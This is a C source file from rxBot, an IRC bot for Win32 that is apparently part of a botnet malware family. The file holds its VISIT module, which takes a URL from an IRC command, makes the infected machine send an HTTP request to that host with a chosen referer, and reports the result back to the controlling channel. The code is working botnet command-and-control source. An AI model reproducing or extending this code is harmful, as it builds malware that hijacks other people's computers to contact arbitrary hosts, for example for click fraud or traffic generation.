/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_VISIT

DWORD WINAPI VisitThread(LPVOID param)
{
	HINTERNET ch = 0, req = 0;

	const char *accept = "*/*";
	char vhost[128], vuser[128], vpass[128], vpath[256], sendbuf[IRCLINE];

	VISIT visit = *((VISIT *)param);
	VISIT *visits = (VISIT *)param;
	visits->gotinfo = TRUE;

	// zero out string varaiables
	memset(vhost, 0, sizeof(vhost));
	memset(vuser, 0, sizeof(vuser));
	memset(vpass, 0, sizeof(vpass));
	memset(vpath, 0, sizeof(vpath));

	// zero out url structure and set options
	URL_COMPONENTS url;
	memset(&url, 0, sizeof(url));
	url.dwStructSize = sizeof(url);
	url.dwHostNameLength = 1;
    url.dwUserNameLength = 1;
    url.dwPasswordLength = 1;
    url.dwUrlPathLength = 1;

	do {
		// crack the url (break it into its main parts)
		if (!fInternetCrackUrl(visit.host, strlen(visit.host), 0, &url)) {
			sprintf(sendbuf,"[VISIT]: Invalid URL.");
			break;
		}

		// copy url parts into variables
		if (url.dwHostNameLength > 0) 
			strncpy(vhost, url.lpszHostName, url.dwHostNameLength);
		unsigned short vport = url.nPort;
		if (url.dwUserNameLength > 0) 
			strncpy(vuser, url.lpszUserName, url.dwUserNameLength);
		if (url.dwPasswordLength > 0) 
			strncpy(vpass, url.lpszPassword, url.dwPasswordLength);
		if (url.dwUrlPathLength > 0) 
			strncpy(vpath, url.lpszUrlPath, url.dwUrlPathLength);

		ch = fInternetConnect(ih, vhost,vport, vuser, vpass, INTERNET_SERVICE_HTTP, 0, 0);
		if (ch == NULL) {
			sprintf(sendbuf,"[VISIT]: Could not open a connection.");
			break;
		}

		req = fHttpOpenRequest(ch, NULL, vpath, NULL, visit.referer, &accept, INTERNET_FLAG_NO_UI, 0);
		if (req == NULL) {
			sprintf(sendbuf,"[VISIT]: Failed to connect to HTTP server.");
			break;
		}

		if (fHttpSendRequest(req, NULL, 0, NULL, 0))
			sprintf(sendbuf,"[VISIT]: URL visited.");
		else
			sprintf(sendbuf,"[VISIT]: Failed to get requested URL from HTTP server.");		
	} while(0); // always false, so this never loops, only helps make error handling easier

	if (!visit.silent) irc_privmsg(visit.sock, visit.chan, sendbuf, visit.notice);
	addlog(sendbuf);

	fInternetCloseHandle(ch);
	fInternetCloseHandle(req);

	clearthread(visit.threadnum);

	ExitThread(0);
}
#endif
